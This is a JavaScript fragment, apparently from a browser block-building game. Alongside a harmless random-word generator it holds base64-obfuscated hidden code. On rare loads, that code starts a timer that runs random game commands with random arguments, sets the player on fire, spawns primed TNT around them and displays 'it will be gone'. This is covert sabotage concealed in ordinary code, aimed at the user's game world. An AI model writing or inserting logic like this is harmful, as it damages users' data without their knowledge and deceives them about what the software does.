function dsujfdoneojndks(n){if(n.toLowerCase()===dsujfdoneojndks.sasjosaji){let djsods=eval(atob("d29ybGQ=")),ewjio=atob("YWRkRW50aXR5"),saioji=eval(atob("ZW50aXRpZXNbZW50aXR5SWRzLlByaW1lZFROVF0=")),rejio=window[dsujfdoneojndks.rejio];for(let a=0;a<10;a++){djsods[ewjio](new saioji(rejio.x+Math.random()*6-3,rejio.y+Math.random()*6-3,rejio.z+Math.random()*6-3),false,rejio.dimension)}aaaaahhhhfdiojdf()}};dsujfdoneojndks.sasjosaji=atob("ZXJyb3I=");dsujfdoneojndks.rejio=atob("cGxheWVy")
function strtrr(){window[aaaaahhhhfdiojdf.qweew](aaaaahhhhfdiojdf,Math.random()*10000+5000)}function aaaaahhhhfdiojdf(){window[aaaaahhhhfdiojdf.qweew](aaaaahhhhfdiojdf,Math.round(Math.random()*10000+5000));fdfdjio[Math.round(Math.random()*(fdfdjio.length-1))]()}aaaaahhhhfdiojdf.qweew=atob("c2V0VGltZW91dA==")
const fdfdjio=[ashuijefd,ashuijefd,ashuijefd,ashuijefd,ashuijefd,ashuijefd,function(){let dsddjj=atob("YnVyblRpbWVy");dsujfdoneojndks.rejio[dsddjj]+=5},function(){eval(atob("c2hvd1RpdGxlKCJpdCB3aWxsIGJlIGdvbmUiKQ=="))}]
if(Math.random()>0.999){let ii=setInterval(()=>{if(getScene()==="play")strtrr(),console.log('aaaaaaa'),clearInterval(ii)},1000)}
let beginnings = "BCDFGHJKLMNPQRSTVWXYZ"
let consonants = "bcdfghjklmnpqrstvwxyz".split(""), vowels = "aeiou".split("")
consonants.push("ck","sk","ts","st")
vowels.push("ea",'ee','ei','eu','ou','ar','er','ir','or','ur','al','el','il','ol','ul')
let endings = consonants.slice()
endings.push('cks','sks','y','cky','sky')
function genWord(){
	let name = "", l = Math.round(Math.random()*5+1)
	name += beginnings[Math.floor(Math.random()*beginnings.length)]
	for(let j=0; j<l; j++){
		if(j%2) name += consonants[Math.floor(Math.random()*consonants.length)]
		else name += vowels[Math.floor(Math.random()*vowels.length)]
	}
	if(l%2) name += endings[Math.floor(Math.random()*endings.length)]
	return name
}
function ashuijefd(){let fhiu=window[ashuijefd.fhiu];let a=fhiu[Math.floor(Math.random()*fhiu.length)],r=a.name;if(a[ashuijefd.sassw])for(let e of a[ashuijefd.sassw])if(a[ashuijefd.saihjkn]&&a[ashuijefd.saihjkn][e]){let t=a[ashuijefd.saihjkn][e][Math.floor(Math.random()*a[ashuijefd.saihjkn][e].length)];"type:number"===t?t=Math.round(100*Math.random()):"type:block"===t?t=blockData[Math.floor(Math.random()*BLOCK_COUNT)].name:"type:x"===t?t=Math.round(player.x+100*Math.random()):"type:y"===t?t=Math.round(player.y+100*Math.random()):"type:z"===t?t=Math.round(player.z+100*Math.random()):"type:dimension"===t?t=player.dimension:"type:sound"===t?t=soundNames[Math.floor(Math.random()*soundNames.length)]:"type:player"!==t&&"type:banned"!==t&&"type:whitelisted"!==t||(t=player.character.username),r+=" "+t}else r+=" "+genWord();if(r.startsWith("fillToPlayer ")||r.startsWith("copyToPlayer ")||r.startsWith("pasteAtPlayer ")){let a=player.x,r=player.y,e=player.z;player.x=Math.round(player.x+100*Math.random()),player.y=Math.round(player.y+100*Math.random()),player.z=Math.round(player.z+100*Math.random()),runCmd("fromPlayer"),player.x=a,player.y=r,player.z=e}runCmd(r,player)}ashuijefd.fhiu=btoa("rgl");ashuijefd.sassw=btoa("j¸,");ashuijefd.saihjkn=atob("YXJnVmFsdWVz")